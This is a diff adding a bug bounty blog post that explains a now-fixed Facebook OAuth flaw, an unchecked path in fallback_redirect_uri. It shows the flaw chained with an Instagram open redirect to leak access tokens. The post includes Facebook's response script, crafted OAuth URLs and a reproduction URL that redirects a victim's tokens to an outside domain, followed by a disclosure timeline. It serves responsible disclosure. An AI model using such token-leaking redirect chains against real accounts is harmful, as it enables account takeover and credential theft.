@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Facebook account takeover due to a bypass of allowed callback URLs in the OAuth flow | Youssef Sammouda (sam0) personal blog</title>
+<meta name="generator" content="Jekyll v4.3.4" />
+<meta property="og:title" content="Facebook account takeover due to a bypass of allowed callback URLs in the OAuth flow" />
+<meta name="author" content="qw" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="This bug could allow a malicious user to takeover Facebook or Instagram accounts due to missing URL path checking in fallback_redirect_uri parameter specified in the Facebook OAuth flow endpoints." />
+<meta property="og:description" content="This bug could allow a malicious user to takeover Facebook or Instagram accounts due to missing URL path checking in fallback_redirect_uri parameter specified in the Facebook OAuth flow endpoints." />
+<link rel="canonical" href="http://localhost:4000/2021/04/02/facebook-account-takeover-due-to-a-bypass-of-allowed-callback-urls-in-the-oauth-flow.html" />
+<meta property="og:url" content="http://localhost:4000/2021/04/02/facebook-account-takeover-due-to-a-bypass-of-allowed-callback-urls-in-the-oauth-flow.html" />
+<meta property="og:site_name" content="Youssef Sammouda (sam0) personal blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2021-04-02T00:27:30+01:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Facebook account takeover due to a bypass of allowed callback URLs in the OAuth flow" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"qw"},"dateModified":"2021-04-02T00:27:30+01:00","datePublished":"2021-04-02T00:27:30+01:00","description":"This bug could allow a malicious user to takeover Facebook or Instagram accounts due to missing URL path checking in fallback_redirect_uri parameter specified in the Facebook OAuth flow endpoints.","headline":"Facebook account takeover due to a bypass of allowed callback URLs in the OAuth flow","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/2021/04/02/facebook-account-takeover-due-to-a-bypass-of-allowed-callback-urls-in-the-oauth-flow.html"},"url":"http://localhost:4000/2021/04/02/facebook-account-takeover-due-to-a-bypass-of-allowed-callback-urls-in-the-oauth-flow.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/main.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="Youssef Sammouda (sam0) personal blog" /></head>
+<body><header class="site-header" role="banner">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">Youssef Sammouda (sam0) personal blog</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger"><a class="page-link" href="/about/">About</a></div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">Facebook account takeover due to a bypass of allowed callback URLs in the OAuth flow</h1>
+    <p class="post-meta">
+      <time class="dt-published" datetime="2021-04-02T00:27:30+01:00" itemprop="datePublished">Apr 2, 2021
+      </time>• <span itemprop="author" itemscope itemtype="http://schema.org/Person"><span class="p-author h-card" itemprop="name">qw</span></span></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <p>This bug could allow a malicious user to takeover Facebook or Instagram accounts due to missing URL path checking in fallback_redirect_uri parameter specified in the Facebook OAuth flow endpoints.</p>
+
+<p><strong>Details</strong></p>
+
+<p>In the domain <a href="https://m.facebook.com/">m.facebook.com</a>, the endpoint <strong>https://m.facebook.com/dialog/oauth</strong> which handles Facebook OAuth flow, has a preformatted response when the requesting to get an access_token/code via the postMessage return method to an opener window ( via xd_arbiter). The script in the response would try to make a postMessage to the target origin specified and checked in the redirect_uri as explained below:</p>
+
+<p>Let’s take the example of the OAuth flow for authorizing the Instagram application. The visited url would be something like this <br />
+<strong>https://m.facebook.com/v3.3/dialog/oauth?app_id=124024574287414</strong><br />
+<strong>&amp;redirect_uri=https://staticxx.facebook.com/x/connect/xd_arbiter/?version=46%23origin=https://www.instagram.com/%26relation=opener</strong><br />
+<strong>&amp;response_type=token,signed_request</strong><br />
+<strong>&amp;scope=public_profile,email</strong></p>
+
+<p>Here the interesting part is the redirect_uri parameter. Instead of selecting the whitelisted redirect_uri for this application , we would select the infamous xd_arbiter endpoint which would allow us to receive the Facebook code/access_token via javascript method for cross-window communication, the postMessage method. Here the origin parameter in the fragment part of the staticxx.facebook.com url must contain a whitelisted website by the Facebook application or the request would fail. The same origin would be served in the response as the targetOrigin for the postMessage method.</p>
+
+<p>Although the user can’t get the access_token via an Eventlistener due to the reasons i previously pointed ( postMessage targetOrigin can’t be manipulated ), i found that there’s another way to get the access_token/code in case the postMessage method failed:</p>
+
+<p>We modify the previous URL to be like the following:<br />
+<strong>https://m.facebook.com/v3.3/dialog/oauth?app_id=124024574287414</strong><br />
+<strong>&amp;redirect_uri=https://staticxx.facebook.com/x/connect/xd_arbiter/?version=46%23origin=https://www.instagram.com/%26relation=opener</strong><br />
+<strong>&amp;response_type=token,signed_request</strong><br />
+<strong>&amp;scope=public_profile,email</strong><br />
+<strong>&amp;fallback_redirect_uri=https://www.instagram.com/</strong></p>
+
+<p>We would get a similar response as this one:</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">closeURI</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">https:</span><span class="se">\</span><span class="s2">/</span><span class="se">\</span><span class="s2">/m.facebook.com</span><span class="se">\</span><span class="s2">/dialog</span><span class="se">\</span><span class="s2">/close_window</span><span class="se">\</span><span class="s2">/?app_id=124024574287414&amp;connect=1&amp;redirect_domain=www.instagram.com</span><span class="dl">"</span><span class="p">;</span>
+<span class="kd">var</span> <span class="nx">fallbackRedirectURI</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">https:</span><span class="se">\</span><span class="s2">/</span><span class="se">\</span><span class="s2">/www.instagram.com</span><span class="se">\</span><span class="s2">/#SIGNED_REQUEST&amp;access_token=ACCESS_TOKEN</span><span class="dl">"</span><span class="p">;</span>
+<span class="kd">var</span> <span class="nx">message</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">origin=https</span><span class="se">\</span><span class="s2">u00253A</span><span class="se">\</span><span class="s2">u00252F</span><span class="se">\</span><span class="s2">u00252Fwww.instagram.com</span><span class="se">\</span><span class="s2">u00252F&amp;relation=opener&amp;signed_request=SIGNED_REQUEST&amp;access_token=ACCESS_TOKEN&amp;data_access_expiration_time=0&amp;expires_in=0</span><span class="dl">"</span><span class="p">,</span>
+    <span class="nx">origin</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">https:</span><span class="se">\</span><span class="s2">/</span><span class="se">\</span><span class="s2">/www.instagram.com</span><span class="dl">"</span><span class="p">,</span>
+    <span class="nx">domain</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">www.instagram.com</span><span class="dl">"</span><span class="p">,</span>
+    <span class="nx">relation</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">opener</span><span class="dl">"</span><span class="p">,</span>
+    <span class="nx">debugXD</span> <span class="o">=</span> <span class="kc">false</span><span class="p">,</span>
+    <span class="nx">xrw</span> <span class="o">=</span> <span class="dl">""</span><span class="p">;</span>
+<span class="p">(</span><span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
+    <span class="kd">var</span> <span class="nx">a</span> <span class="o">=</span> <span class="nb">window</span><span class="p">.</span><span class="nx">opener</span> <span class="o">||</span> <span class="nb">window</span><span class="p">.</span><span class="nx">parent</span><span class="p">,</span>
+        <span class="nx">b</span> <span class="o">=</span> <span class="nb">navigator</span><span class="p">.</span><span class="nx">userAgent</span><span class="p">,</span>
+        <span class="nx">c</span> <span class="o">=</span> <span class="o">!</span><span class="mi">0</span><span class="p">;</span>
+
+    <span class="kd">function</span> <span class="nf">d</span><span class="p">(</span><span class="nx">a</span><span class="p">,</span> <span class="nx">b</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nx">a</span> <span class="o">=</span> <span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">hostname</span><span class="p">.</span><span class="nf">match</span><span class="p">(</span><span class="sr">/</span><span class="se">\.(</span><span class="sr">facebook</span><span class="se">\.</span><span class="sr">sg|facebookcorewwwi</span><span class="se">\.(?:</span><span class="sr">test</span><span class="se">)?</span><span class="sr">onion</span><span class="se">)</span><span class="sr">$/</span><span class="p">);</span>
+        <span class="nx">a</span> <span class="o">=</span> <span class="nx">a</span> <span class="p">?</span> <span class="nx">a</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="p">:</span> <span class="dl">"</span><span class="s2">facebook.com</span><span class="dl">"</span><span class="p">;</span>
+        <span class="k">new</span> <span class="nc">Image</span><span class="p">().</span><span class="nx">src</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">https://m.</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">a</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">/common/scribe_endpoint.php?c=jssdk_error&amp;m=</span><span class="dl">"</span> <span class="o">+</span> <span class="nf">encodeURIComponent</span><span class="p">(</span><span class="nx">JSON</span><span class="p">.</span><span class="nf">stringify</span><span class="p">(</span><span class="nx">b</span><span class="p">))</span>
+    <span class="p">}</span>
+
+    <span class="kd">function</span> <span class="nf">e</span><span class="p">()</span> <span class="p">{</span>
+        <span class="kd">var</span> <span class="nx">b</span> <span class="o">=</span> <span class="nx">a</span> <span class="o">===</span> <span class="nb">window</span><span class="p">;</span>
+        <span class="k">try</span> <span class="p">{</span>
+            <span class="nx">a</span> <span class="o">!=</span> <span class="kc">null</span> <span class="o">&amp;&amp;</span> <span class="nx">a</span> <span class="o">!==</span> <span class="nb">window</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nx">a</span> <span class="o">===</span> <span class="nb">window</span><span class="p">.</span><span class="nx">opener</span> <span class="o">&amp;&amp;</span> <span class="nx">relation</span> <span class="o">===</span> <span class="dl">"</span><span class="s2">opener.parent</span><span class="dl">"</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nx">a</span> <span class="o">=</span> <span class="nb">window</span><span class="p">.</span><span class="nx">opener</span><span class="p">.</span><span class="nx">parent</span><span class="p">),</span> <span class="nx">a</span><span class="p">.</span><span class="nf">postMessage</span><span class="p">(</span><span class="nx">message</span><span class="p">,</span> <span class="nx">origin</span><span class="p">),</span> <span class="nb">window</span><span class="p">.</span><span class="nf">close</span><span class="p">(),</span> <span class="nb">window</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="dl">""</span><span class="p">,</span> <span class="dl">"</span><span class="s2">_self</span><span class="dl">"</span><span class="p">,</span> <span class="dl">""</span><span class="p">),</span> <span class="nb">window</span><span class="p">.</span><span class="nf">close</span><span class="p">()),</span> <span class="nb">window</span><span class="p">.</span><span class="nx">closed</span> <span class="o">||</span> <span class="p">(</span><span class="nx">fallbackRedirectURI</span> <span class="p">?</span> <span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nf">replace</span><span class="p">(</span><span class="nx">fallbackRedirectURI</span><span class="p">)</span> <span class="p">:</span> <span class="nx">closeURI</span> <span class="p">?</span> <span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nf">replace</span><span class="p">(</span><span class="nx">closeURI</span><span class="p">)</span> <span class="p">:</span> <span class="nf">d</span><span class="p">(</span><span class="dl">"</span><span class="s2">jssdk_error</span><span class="dl">"</span><span class="p">,</span> <span class="p">{</span>
+                <span class="na">error</span><span class="p">:</span> <span class="dl">"</span><span class="s2">DIALOG_CLOSE</span><span class="dl">"</span><span class="p">,</span>
+                <span class="na">extra</span><span class="p">:</span> <span class="p">{</span>
+                    <span class="na">message</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Dialog did not close. refWasSelf: </span><span class="dl">"</span> <span class="o">+</span> <span class="nx">b</span>
+                <span class="p">}</span>
+            <span class="p">}))</span>
+        <span class="p">}</span> <span class="k">catch </span><span class="p">(</span><span class="nx">a</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nx">c</span> <span class="p">?</span> <span class="p">(</span><span class="nx">c</span> <span class="o">=</span> <span class="o">!</span><span class="mi">1</span><span class="p">,</span> <span class="nb">window</span><span class="p">.</span><span class="nf">setTimeout</span><span class="p">(</span><span class="nx">e</span><span class="p">,</span> <span class="mi">200</span><span class="p">))</span> <span class="p">:</span> <span class="nf">d</span><span class="p">(</span><span class="dl">"</span><span class="s2">jssdk_error</span><span class="dl">"</span><span class="p">,</span> <span class="p">{</span>
+                <span class="na">error</span><span class="p">:</span> <span class="dl">"</span><span class="s2">POST_MESSAGE</span><span class="dl">"</span><span class="p">,</span>
+                <span class="na">extra</span><span class="p">:</span> <span class="p">{</span>
+                    <span class="na">message</span><span class="p">:</span> <span class="nx">a</span><span class="p">.</span><span class="nx">message</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">, html/js/mobile/connect/XDDialogResponsePurePostMessage.js:43 refWasSelf: </span><span class="dl">"</span> <span class="o">+</span> <span class="nx">b</span>
+                <span class="p">}</span>
+            <span class="p">})</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+
+    <span class="kd">function</span> <span class="nf">f</span><span class="p">()</span> <span class="p">{</span>
+        <span class="nx">__fbNative</span><span class="p">.</span><span class="nf">postMessage</span><span class="p">(</span><span class="nx">message</span><span class="p">,</span> <span class="nx">origin</span><span class="p">)</span>
+    <span class="p">}</span>
+    <span class="k">if </span><span class="p">(</span><span class="nb">window</span> <span class="o">==</span> <span class="nx">top</span> <span class="o">&amp;&amp;</span> <span class="sr">/FBAN</span><span class="se">\/\w</span><span class="sr">+;/i</span><span class="p">.</span><span class="nf">test</span><span class="p">(</span><span class="nx">b</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="sr">/FBAN</span><span class="se">\/</span><span class="sr">mLite;/</span><span class="p">.</span><span class="nf">test</span><span class="p">(</span><span class="nx">b</span><span class="p">))</span> <span class="nb">window</span><span class="p">.</span><span class="nx">__fbNative</span> <span class="o">&amp;&amp;</span> <span class="nx">__fbNative</span><span class="p">.</span><span class="nx">postMessage</span> <span class="p">?</span> <span class="nf">f</span><span class="p">()</span> <span class="p">:</span> <span class="nb">window</span><span class="p">.</span><span class="nf">addEventListener</span><span class="p">(</span><span class="dl">"</span><span class="s2">fbNativeReady</span><span class="dl">"</span><span class="p">,</span> <span class="nx">f</span><span class="p">);</span>
+    <span class="k">else</span> <span class="p">{</span>
+        <span class="nx">f</span> <span class="o">=</span> <span class="sr">/iPhone.*Version</span><span class="se">\/(</span><span class="sr">5|6</span><span class="se">)</span><span class="sr">/</span><span class="p">.</span><span class="nf">test</span><span class="p">(</span><span class="nx">b</span><span class="p">)</span> <span class="p">?</span> <span class="nb">RegExp</span><span class="p">.</span><span class="nx">$1</span> <span class="o">===</span> <span class="dl">"</span><span class="s2">5</span><span class="dl">"</span> <span class="p">?</span> <span class="mi">250</span> <span class="p">:</span> <span class="mi">800</span> <span class="p">:</span> <span class="mi">0</span><span class="p">;</span>
+        <span class="nx">f</span> <span class="p">?</span> <span class="nb">window</span><span class="p">.</span><span class="nf">setTimeout</span><span class="p">(</span><span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
+            <span class="nf">e</span><span class="p">()</span>
+        <span class="p">},</span> <span class="nx">f</span><span class="p">)</span> <span class="p">:</span> <span class="nf">e</span><span class="p">()</span>
+    <span class="p">}</span>
+<span class="p">})();</span>
+
+
+</code></pre></div></div>
+
+<p>The same script would redirect to a selected URL in a parameter called <strong>fallback_redirect_uri</strong> in case the domain of the URL inside fallback_redirect_url is the same as a website whitelisted by the application and if other conditions are fulfilled. This would only occur if no opener window was found because <strong>window.close</strong> won’t work and <strong>window.closed</strong> would be false and in that case <strong>window.location.replace(fallbackRedirectURI)</strong> would be executed and a redirect would be made to the URL selected in fallback_redirect_uri with the Facebook access_token/code embedded in the fragment part of the URL. <br />
+The actual bug now is that the <strong>fallback_redirect_uri</strong> would only accept a whitelisted website set in the Facebook application configuration however no checks were done to the path part of URL like what is normally done to urls supplied in redirect_uri parameter in OAuth flows ( only domain part was checked ). The attacker could select any path to receive the token. We can chain this with another bug in the receiving website like an open redirect to leak the token to the attacker website ( since the fragment part of the URL is carried by the browser in redirects, the malicious website would receive it ). <br />
+I have achieved Facebook/Instagram account takeover by chaining this bug and a <a href="https://ysamm.com/?p=625">previously reported open redirect in Instagram</a>.</p>
+
+<p><strong>Reproduction Steps</strong></p>
+
+<p>The victim should visit this url or an attacker website which redirects to it:</p>
+
+<p><strong>https://m.facebook.com/v3.3/dialog/oauth?app_id=124024574287414&amp;redirect_uri=https://staticxx.facebook.com/x/connect/xd_arbiter/?version=46%23origin=https://www.instagram.com/%26relation=opener&amp;response_type=token,signed_request&amp;scope=public_profile,email&amp;fallback_redirect_uri=https://www.instagram.com/accounts/convert_to_professional_account/?redirect_uri=https://ysamm.com</strong> <br />
+This would redirect to <strong>https://www.instagram.com/accounts/convert_to_professional_account/?redirect_uri=https://ysamm.com#access_token&amp;signed_request</strong> and since this contained an open redirect it would redirect to <strong>https://ysamm.com#access_token&amp;signed_request</strong>.</p>
+
+<p>The access_token is a first-party token generated for the Instagram application and could be used to takeover the Facebook account. The signed_request contains a code that could be used too to access the victim’s Instagram account.</p>
+
+<p><strong>Timeline</strong></p>
+
+<p>Feb 7, 2021— Report Sent <br />
+Feb 8, 2021— Acknowledged by Facebook<br />
+Feb 18, 2021— Fixed by Facebook<br />
+Feb 26, 2021 — $30K (including bonus) bounty awarded by Facebook.<br />
+Feb 26, 2021 – A bypass was sent to the team which allowed this to work despite the fix in mobile devices.<br />
+Mar 5, 2021— Acknowledged by Facebook<br />
+Mar 17, 2021— Fixed by Facebook<br />
+Mar 22, 2021 — $12K (including bonus) bounty awarded by Facebook.</p>
+
+  </div><a class="u-url" href="/2021/04/02/facebook-account-takeover-due-to-a-bypass-of-allowed-callback-urls-in-the-oauth-flow.html" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <h2 class="footer-heading">Youssef Sammouda (sam0) personal blog</h2>
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col footer-col-1">
+        <ul class="contact-list">
+          <li class="p-name">Youssef Sammouda (sam0) personal blog</li></ul>
+      </div>
+
+      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://github.com/samm0uda"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">samm0uda</span></a></li><li><a href="https://www.twitter.com/samm0uda"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#twitter"></use></svg> <span class="username">samm0uda</span></a></li></ul>
+</div>
+
+      <div class="footer-col footer-col-3">
+        <p>The goal of this blog is to share write-ups about bugs i have found in Facebook and reported to them under the Facebook bug bounty program.</p>
+      </div>
+    </div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
